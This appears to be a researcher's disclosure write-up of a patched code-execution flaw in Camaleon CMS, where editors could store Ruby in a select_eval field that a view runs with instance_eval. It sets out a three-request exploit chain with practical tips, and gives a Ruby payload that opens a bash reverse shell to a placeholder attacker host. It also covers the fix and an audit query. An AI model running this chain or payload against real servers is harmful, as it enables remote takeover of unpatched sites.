**Severity:** High (CVSS 4.0: 8.7) · **Status:** Patched in v2.9.2

## Where It Started

I was going through the source code of Camaleon CMS, a Ruby on Rails content management system with a decent install base. I was not looking for anything specific, just reading through how things were wired together.

At some point I landed on the custom fields system. Camaleon has a fairly powerful custom field engine that lets admins attach extra fields to posts, pages, and users. You can define text fields, dropdowns, file uploads, all the usual stuff. Nothing alarming on the surface.

Then I saw `select_eval`.

---

## The Interesting Field Type

Among the available field types, `select_eval` stood out. Its purpose is to let you define a select dropdown where the list of options is generated by a Ruby expression you provide. Flexible, sure. The definition in `custom_fields_helper.rb` describes it plainly:

```ruby
# app/helpers/camaleon_cms/admin/custom_fields_helper.rb, lines 302-318
items[:select_eval] = {
  key: 'select_eval',
  label: t('camaleon_cms.admin.custom_field.fields.select_eval'),
  options: { required: true, multiple: false, default_value: '', show_frontend: false },
  extra_fields: [{ type: 'text_area', key: 'command', label: 'Command to Eval' }]
}
```

"Command to Eval." Whoever named that was at least being honest.

The expression gets stored in `field.options[:command]` and then rendered in `_select_eval.html.erb`:

```erb
<%# app/views/camaleon_cms/admin/settings/custom_fields/fields/_select_eval.html.erb, line 2 %>
<%= select_tag "#{field_name}[#{field.slug}][values][]",
      instance_eval(field.options[:command].to_s.strip),
      class: "form-control input-value #{'required' if field.options[:required].to_s.to_bool}" %>
```

`instance_eval`. On a value read from the database. In a Rails ERB view, which means the binding has access to helpers, request context, and everything the view layer can touch. Every time someone opens a post edit page that uses this field group, that expression runs.

## What Makes This Exploitable

Storing and executing arbitrary Ruby in the database is dangerous on its own. But the question is always: who can write to that field?

I checked the controller. In `custom_fields_controller.rb`, the method responsible for saving field options was `_save_fields`:

```ruby
# app/controllers/camaleon_cms/admin/settings/custom_fields_controller.rb, lines 100-102
def _save_fields(group)
  errors_saved, _all_fields = group.add_fields(
    params[:fields] ? params.require(:fields).permit! : {},
    params[:field_options] ? params.require(:field_options).permit! : {}
  )
end
```

`permit!`. That means every parameter under `field_options` goes straight through to the model, including `command`. No whitelist and no filtering. You POST `field_options[x][command]=<your Ruby>` and it gets written to the database.

So now I needed to know who can reach that endpoint. The permission check in `ability.rb` grants `can :manage` to any key present in the role's `@roles_manager` hash, including `custom_fields`:

```ruby
# app/models/camaleon_cms/ability.rb, lines 161-165
@roles_manager.try(:each) do |rol_manage_key, val_role|
  can :manage, rol_manage_key.to_sym if val_role.to_s.cama_true?
rescue StandardError
  false
end
```

There is no explicit list of which keys are safe to grant `manage` to and which are not. `custom_fields` is treated the same as `media` or `comments`. On most Camaleon installations, editor-level accounts have this permission. This is not an admin-only gate. An attacker who gets hold of any editor account has everything they need.

## Putting It Together

![](/images/come-sit-here.gif)

The full chain is three HTTP requests:

1. Log in as any user with `custom_fields` permission
2. POST to `/admin/settings/custom_fields` to create a field group with a `select_eval` field where `command` is your payload
3. GET any post edit page that uses the field group — `instance_eval` fires immediately

For the payload I used a `Thread.new` wrapper so the page render does not hang waiting for the shell to return:

```ruby
[["ok","ok"]].tap{Thread.new{system("bash -i >& /dev/tcp/ATTACKER/PORT 0>&1")}}
```

`instance_eval` returns the array (making the `select_tag` happy), while the thread quietly opens a reverse shell in the background.

Two things tripped me up during testing. First, the `assign_group` parameter when creating the field group must be `PostType_Post,<type_id>` — not just `PostType,<type_id>`. The difference matters because `get_field_groups` on the Post model queries for `object_class = 'PostType_Post'` specifically, so a field group created with the wrong class never gets rendered and the payload never fires. Second, the strings inside the payload need to use double quotes. Ruby single-quoted strings do not interpolate `#{}`, so any backtick commands wrapped in single quotes execute as literal text and do nothing.

## A Note on Prior Research

GitHub Security Lab published a batch of five advisories against Camaleon CMS in late 2024 (GHSL-2024-182 through GHSL-2024-186). One of them, GHSL-2024-185, covers a field type called `label_eval` which has the exact same root cause: arbitrary Ruby executed via `instance_eval` in a view. Two of the five advisories received CVE numbers; GHSL-2024-185 was not one of them.

`select_eval` and `label_eval` are siblings. Same mechanism, different field type, different execution site, different write path. This report is specifically about `select_eval`.

---

## Affected Versions

The vulnerability was introduced in commit `415cbda6` on 2015-10-16, when `select_eval` was first added. It affected every release from 2.1.1 through 2.9.1.

The fix landed in v2.9.2 (commit `15882366`, 2026-03-29). The `permit!` call was replaced with an explicit whitelist that omits `command`, and a separate permission gate was added so that only admins can create `select_eval` fields at all. Worth noting: `instance_eval` itself was not removed. The fix is about tightening who can write the expression, not about removing the eval.

If you are running any version older than v2.9.2, update now.

If you are already on v2.9.2, it is worth auditing your database. Any `select_eval` field that exists in the database still executes its stored expression on every render. Run this query and review what comes back:

```sql
SELECT * FROM metas
WHERE key = '_default'
AND value LIKE '%select_eval%';
```

## Final Thoughts

This one is a good reminder that `eval` in any form deserves a second look, especially when the input comes from the database rather than directly from a request. Database values feel "safe" because they passed through the application at some earlier point, but if the write path had no sanitization, the stored value is just as attacker-controlled as anything in a POST body.
